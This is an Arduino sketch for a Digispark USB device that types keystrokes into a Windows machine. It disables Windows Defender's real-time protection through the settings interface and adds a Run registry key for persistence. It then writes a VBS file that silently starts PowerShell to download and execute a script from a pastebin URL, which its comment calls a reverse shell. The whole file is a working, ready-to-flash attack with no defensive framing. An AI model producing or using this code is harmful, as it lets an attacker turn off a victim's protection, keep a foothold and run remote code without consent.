#include "DigiKeyboard.h"
#define KEY_ALT 226
#define KEY_TAB 43
void setup() {
  //disable Windows Defender
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("windowsdefender://threat/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_RIGHT);

  //open reverse shell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //create reg autoexec
  DigiKeyboard.println("REG ADD HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Data /t REG_EXPAND_SZ /d \"C:\\Users\\mogek\\a.vbs\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //create payload file
  DigiKeyboard.println("echo CreateObject(\"Wscript.Shell\").Run \"powershell IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/s1WEjiqj');\",0,True > a.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //execute itcm
  DigiKeyboard.println("wscript a.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_RIGHT);
}


void loop() {
  
}
/*
win+r
windowsdefender://threat/
ENTER
TAB
TAB
TAB
TAB
ENTER
SPACE
<-
ENTER
ALT+F4
*/
